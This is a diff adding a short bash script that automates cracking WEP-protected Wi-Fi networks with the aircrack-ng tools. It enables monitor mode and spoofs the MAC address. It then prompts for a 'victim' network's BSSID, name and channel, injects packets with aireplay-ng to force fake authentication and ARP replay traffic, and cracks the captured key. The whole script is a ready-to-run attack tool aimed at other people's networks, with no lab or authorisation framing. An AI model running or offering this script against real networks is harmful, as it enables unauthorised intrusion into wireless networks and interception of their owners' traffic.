@@ -1,0 +1,30 @@
+#!/bin/bash
+# Script by ScZi
+#Rename script to filename.sh
+#Give script execute permissions via following line
+#chmod 755 filename.sh
+#First part, put in the interface you want to monitor i.e. wlan0, eth0, etc
+echo What interface would you like to monitor on?
+read INTERFACE
+airmon-ng start $INTERFACE
+#Spoof MAC Address
+echo What would you like your MAC Address to appear as?
+read MAC
+ifconfig mon0 down
+macchanger --mac=$MAC mon0
+ifconfig mon0 up
+#Check and kill all processes that could interfere with aireplay
+airmon-ng check kill
+#Launches airodump to gather info on victim networks. After you note the network info, press ctrl-c to continue
+xterm -e airodump-ng mon0
+#Gather the last of the info needed to crack WEP network
+echo Please enter Victims BSSID
+read BSSID
+echo What Is the victims network name?
+read ESSID
+echo Please enter the channel the victim is using
+read CHANNEL
+echo What would you like the output file name to be?
+read OUTPUT
+#create output file in which aircrack will use to crack key
+airodump-ng -c $CHANNEL -w $OUTPUT --bssid $BSSID mon0 & xterm -e aireplay-ng -1 3 -a $BSSID -h $MAC -e $ESSID mon0 & xterm -e aireplay-ng -3 -b $BSSID -h $MAC mon0 & xterm -e aircrack-ng $OUTPUT-01.cap
